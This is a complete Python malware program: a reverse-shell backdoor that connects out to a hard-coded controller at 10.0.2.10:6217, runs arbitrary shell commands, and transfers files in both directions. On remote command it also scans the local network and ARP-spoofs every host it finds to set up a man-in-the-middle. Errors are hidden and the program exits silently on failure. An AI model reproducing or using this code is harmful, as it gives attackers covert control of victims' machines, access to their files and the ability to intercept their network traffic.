#!/usr/bin/env python

import socket
import subprocess
import json
import os
import base64
import sys
from time import sleep
import multiprocessing
from ctypes import c_bool
import scapy.all as scapy
import re


def execute_system_command(command):
    return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)


def change_working_directory_to(path):
    os.chdir(path)
    return "[+] Changing working directory to " + path


def read_file(path):
    with open(path, "rb") as file:
        return base64.b64encode(file.read())


def write_file(path, content):
    with open(path, "wb") as file:
        file.write(base64.b64decode(content))
        return "[+] Upload successful."


# function that returns a list with responses from a broadcast
def broadcast(ip):
    arp_request = scapy.ARP(pdst=ip)  # ARP object creation, asks who has target IP
    brdcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Ethernet object creation, set destination MAC to broadcast MAC
    arp_request_broadcast = brdcast / arp_request  # Combine into a single packet

    # Send packets with custom Ether, send packet and receive response. "timeout": Time to wait for response
    return scapy.srp(arp_request_broadcast, timeout=2, retry=3, verbose=False)[0]


# function that scans network IPs
def network_scanner():
    route = re.findall(r'[0-9]+(?:\.[0-9]+){3}', str(scapy.conf.route))
    network, i = "0.0.0.0", 0
    while network == "0.0.0.0":
        network, netmask, machine_ip = route[4+i*4], route[5+i*4], route[7+i*4]
        i += 1
    if network and netmask:
        print('Network: {}'.format(network))
        print('Netmask: {}'.format(netmask))
        print("Machine's IP: {}".format(machine_ip))
        try:
            cidr = sum([bin(int(x)).count('1') for x in netmask.split('.')])
            scan_ip = network + '/' + str(cidr)
            final = []
            for _ in range(0, 5):
                temp = [ip[1].psrc for ip in broadcast(scan_ip)]
                if len(temp) > len(final):
                    final = temp
            print('[+] Network scan complete.')
            try:
                final.remove(machine_ip)
            except ValueError:
                pass
            return final  # returns the list with the IPs
        except ValueError:
            print("[!] Something went wrong. Scan failed.")
            return
    else:
        print("[-] Could not read Network or Subnet Mask. Scan failed.")
        return


# function that returns MAC address of selected IP
def get_mac(ip):
    answered_mac = broadcast(ip)
    try:
        return answered_mac[0][1].hwsrc
    except IndexError:
        pass


# function that spoofs IPs
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


# function that restores the communication of two devices
def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)  # count: number of times to send


# function that resets ARP tables and restores original connections
def cleanup(targets, src):
    for target_ip in targets:
        if target_ip != router_ip:
            restore(target_ip, src)
            restore(src, target_ip)
    print("[+] Done!")


# function that creates a Man in the Middle
def arp_spoof(targets, src):
    if SYS_PLATFORM == 'linux':
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write("1")
            while True:
                for target_ip in targets:
                    if target_ip != router_ip:
                        spoof(target_ip, src)
                        spoof(src, target_ip)
                sleep(2)
        except Exception:
            print("[!] Something went wrong ... Resetting ARP Tables...")
            cleanup(targets, src)
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write("0")


def kill_arp():
    if arp_process.is_alive():
        arp_process.terminate()
        print("[!] Arp process terminated ... Resetting ARP Tables...")
        cleanup(selected, router_ip)
        if SYS_PLATFORM == 'linux':
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write("0")  # disable ip forwarding
    else:
        print('[-] No arp spoof running at the moment.')


class Backdoor:
    def __init__(self, ip, port):
        # self.become_persistent()
        self.ip = ip
        self.port = port
        self.connected = multiprocessing.Value(c_bool, False)

    def reconnect(self):
        try:
            self.connection.close()
        except Exception:
            pass
        sleep(5)
        try:
            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.connection.connect((self.ip, self.port))
            self.connected.value = True
        except Exception:
            self.connected.value = False

    # function that sends json objects through socket connection
    def reliable_send(self, data):
        try:
            json_data = json.dumps(data.decode('utf-8')).encode('utf-8')
        except UnicodeDecodeError:
            json_data = json.dumps(str(data)).encode('utf-8')
        except AttributeError:
            json_data = json.dumps(data).encode('utf-8')
        self.connection.send(json_data)

    # function that receives json objects through socket connection
    def reliable_receive(self):
        json_data = "".encode('utf-8')
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data.decode('utf-8'))
            except json.decoder.JSONDecodeError:  # if didn't receive the whole package yet, wait
                continue

    def run(self):
        while True:
            while not self.connected.value:
                self.reconnect()
            while True:
                try:
                    command = self.reliable_receive()
                    if command[0] == "arpspoof":
                        try:
                            kill_arp()
                        except:
                            pass
                        try:
                            scan_result = network_scanner()
                            if scan_result:
                                if router_ip:
                                    global selected
                                    global arp_process
                                    selected = scan_result
                                    arp_process = multiprocessing.Process(target=arp_spoof, args=(selected, router_ip))
                                    print("[+] Initializing Arp Spoof...")
                                    arp_process.start()
                                else:
                                    print("[-] Router IP not found. Choose manually..")
                        except:
                            pass
                    elif command[0] == "killarp":
                        try:
                            kill_arp()
                        except:
                            pass
                    else:
                        try:
                            if command[0] == "exit":
                                pass
                            elif command[0] == "killconnection":
                                self.connected.value = False
                                break
                            elif command[0] == "PING":
                                command_result = "PONG"
                            elif command[0] == "cd" and len(command) > 1:
                                command_result = change_working_directory_to(command[1])
                            elif command[0] == "download":
                                command_result = read_file(command[1])
                            elif command[0] == "upload":
                                command_result = write_file(command[1], command[2])
                            else:
                                command_result = execute_system_command(command)
                        except Exception:
                            command_result = "[-] Error during command execution."
                        self.reliable_send(command_result)
                except OSError:
                    self.connected.value = False
                    break


try:
    SYS_PLATFORM = sys.platform
    selected = []
    arp_process = None
    router_ip = scapy.conf.route.route("0.0.0.0")[2]
    my_backdoor = Backdoor("10.0.2.10", 6217)
    my_backdoor.run()
except Exception:
    sys.exit()
